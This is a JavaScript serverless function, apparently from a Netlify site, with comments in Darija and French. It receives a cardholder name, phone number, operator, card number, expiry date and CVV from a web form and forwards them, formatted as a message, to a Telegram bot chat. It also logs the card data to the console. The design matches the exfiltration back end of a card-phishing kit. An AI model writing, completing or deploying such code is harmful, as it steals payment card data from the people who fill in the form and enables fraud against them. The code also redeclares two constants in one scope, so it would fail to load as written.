exports.handler = async (event) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ success: false, error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);

    const titulaire_de_la_carte = data.titulaire_de_la_carte  || '';
    const phone = data.phone || '';  
    const operator = data.operator || '';
    const cardNumber = data.cardNumber || '';
    const expiry = data.expiry || '';
    const cvv = data.cvv || '';
   


    if (!titulaire_de_la_carte && !phone && !operator && !cardNumber && !expiry && !cvv) {
      return {
        statusCode: 400,
        body: JSON.stringify({ success: false, error: 'Aucune donnée reçue' }),
      };
    }

    // Token w chatId jayin men Environment Variables (khassna nzidohom fi Netlify dashboard)
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    let text = `📩 *Nouveau message dyal client*\n\n`;
    text += `*titulaire_de_la_carte:* ${titulaire_de_la_carte}\n`;
    
    if (titulaire_de_la_carte) text += `*Titulaire de la carte:* ${titulaire_de_la_carte}\n`;
    if (phone) text += `*Téléphone:* ${phone}\n`;
    if (operator) text += `*Opérateur:* ${operator}\n`;
    if (cardNumber) text += `*Numéro de carte:* ${cardNumber}\n`;
    if (expiry) text += `*expiry:* ${expiry}\n`;
    if (cvv) text += `*cvv:* ${cvv}\n`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    console.log("=== DEBUG ===");
console.log("Token exists:", !!token);
console.log("Chat ID:", chatId);
console.log("Message:", text);

const response = await fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    chat_id: chatId,
    text: text,
    parse_mode: 'Markdown',
  }),
});

const result = await response.json();

console.log("Telegram response:", result);

    if (!result.ok) {
      return {
        statusCode: 500,
        body: JSON.stringify({ success: false, error: 'Erreur Telegram API' }),
      };
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, error: error.message } ),
    };
  }


};